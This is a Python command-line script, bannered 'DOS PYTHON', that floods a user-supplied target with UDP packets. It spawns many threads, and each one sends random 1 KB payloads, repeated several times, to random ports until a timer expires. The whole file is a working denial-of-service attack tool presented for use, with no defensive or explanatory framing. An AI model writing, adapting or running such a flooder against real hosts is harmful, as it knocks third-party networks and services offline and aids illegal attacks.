import socket
import random
import threading
import sys
import time
import os

def cls():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

try:
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
except IndexError:
    print('Usage: python ' + sys.argv[0] + ' <target> <threads> <time> !')
    sys.exit
timeout = time.time() + 1 * timer

cls()
arte_ascii = ''' 
*******     *******    ********       *******  **    ** ********** **      **   *******   ****     **
/**////**   **/////**  **//////       /**////**//**  ** /////**/// /**     /**  **/////** /**/**   /**
/**    /** **     //**/**             /**   /** //****      /**    /**     /** **     //**/**//**  /**
/**    /**/**      /**/*********      /*******   //**       /**    /**********/**      /**/** //** /**
/**    /**/**      /**////////**      /**////     /**       /**    /**//////**/**      /**/**  //**/**
/**    ** //**     **        /**      /**         /**       /**    /**     /**//**     ** /**   //****
/*******   //*******   ********       /**         /**       /**    /**     /** //*******  /**    //***
///////     ///////   ////////        //          //        //     //      //   ///////   //      /// 
'''
print(arte_ascii)

def attack():
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendto(bytes*random.randint(5,15),(target, dport))
        return
        sys.exit()
    except:
        pass
print("\n Attack Starting...")
for x in range(0, threads):
    threading.Thread(target=attack).start()

print("\n Attack Sent. Stay with the window open!")
